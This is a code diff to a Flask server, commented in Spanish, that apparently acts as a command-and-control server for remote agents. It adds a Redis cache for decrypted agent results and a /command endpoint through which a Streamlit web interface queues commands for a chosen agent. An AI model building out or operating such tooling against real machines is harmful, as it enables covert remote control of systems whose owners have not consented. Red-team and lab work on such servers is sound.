@@ -243,6 +243,13 @@ def result():
             print(output)
             print("> ", end="", flush=True)
             
+            # Guardar resultado en Redis para que Streamlit lo lea
+            if REDIS_AVAILABLE and redis_client:
+                try:
+                    redis_client.setex(f"result:{msg_id}", 60, output)
+                except Exception:
+                    pass
+            
             return jsonify({"status": "ok"})
         except Exception as e:
             print(f"\n[!] Error decrypting result from {agent_id}: {e}")
@@ -267,6 +274,33 @@ def result():
     print("> ", end="", flush=True)
     
     return jsonify({"status": "ok"})
+
+
+@app.route('/command', methods=['POST'])
+def command_from_ui():
+    """Recibe comandos desde la interfaz web Streamlit."""
+    data = request.json
+    agent_id = data.get('agent_id')
+    command = data.get('command')
+    msg_id = data.get('id', str(uuid.uuid4())[:8])
+    
+    if not agent_id or not command:
+        return jsonify({"error": "agent_id y command requeridos"}), 400
+    
+    with agents_lock:
+        if agent_id not in agents:
+            return jsonify({"error": f"Agente {agent_id} no encontrado"}), 404
+        if agent_id not in pending_commands:
+            pending_commands[agent_id] = []
+        pending_commands[agent_id].append({
+            "type": "cmd",
+            "id": msg_id,
+            "command": command
+        })
+    
+    print(f"\n[UI] Comando desde interfaz -> {agent_id}: {command} (id={msg_id})")
+    print("> ", end="", flush=True)
+    return jsonify({"status": "ok", "id": msg_id})
 
 
 @app.route('/health', methods=['GET'])
